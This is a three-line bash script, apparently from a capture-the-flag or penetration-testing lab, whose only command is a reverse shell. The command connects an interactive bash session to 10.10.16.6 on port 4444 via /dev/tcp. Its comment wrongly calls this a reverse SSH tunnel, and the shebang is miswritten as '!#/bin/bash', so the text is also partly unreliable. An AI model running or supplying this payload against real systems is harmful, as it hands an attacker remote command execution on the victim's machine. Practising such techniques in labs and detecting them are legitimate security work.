!#/bin/bash
# This script is used to create a reverse SSH tunnel from the target machine to the attacker's machine.
bash -i >& /dev/tcp/10.10.16.6/4444 0>&1